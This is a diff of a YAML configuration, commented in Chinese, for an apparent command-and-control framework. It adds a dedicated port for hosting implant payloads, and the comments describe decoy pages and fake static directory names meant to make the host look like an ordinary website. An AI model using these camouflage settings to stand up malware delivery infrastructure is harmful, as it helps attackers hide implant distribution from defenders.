@@ -144,10 +144,12 @@ listener:
     #   由构建 ID 决定 → **永久稳定、可重复下载**，服务端重启后也一致，不落库。
     #   false = 回到老的「面板端口 + /api/v1/...」地址（兼容旧用法）。
     payload_host_enabled: true
-    # ⚠️ 托管依赖「HTTP(S) 轮询监听器」在这个端口上真的在跑：
-    #   监听器端口 TCP/HTTP 互斥（TCP 起得来就跳过 HTTP），TCP 类型时托管地址
-    #   没人应答，服务端会自动回退成面板地址（/api/v1/implant/payload/...）。
-    #   要用托管，就把 listener.protocol 设成 http（或 https，配 tls_enabled）。
+    # payload_host_port：托管**独立端口**（v1.4.3）。0 = 自动取 listener.port + 1。
+    #   为什么单独开端口：监听器端口 TCP/HTTP 互斥（TCP 起得来就跳过 HTTP），
+    #   TCP 部署下那个端口只说 TSHL 帧，不可能应答 HTTP 下载。独立端口只做
+    #   「下载载荷」一件事，其它路径返回拟态诱饵页，看起来就是个静态站点。
+    #   绑定失败只 WARN，下载地址自动回退到面板端口，不影响 C2 主链路。
+    payload_host_port: 0
     # payload_host_prefix：第一段路径，起个伪静态目录名更自然（s / static / assets / dl）。
     #   只允许 [A-Za-z0-9._-]，留空按 "s" 处理。
     payload_host_prefix: s
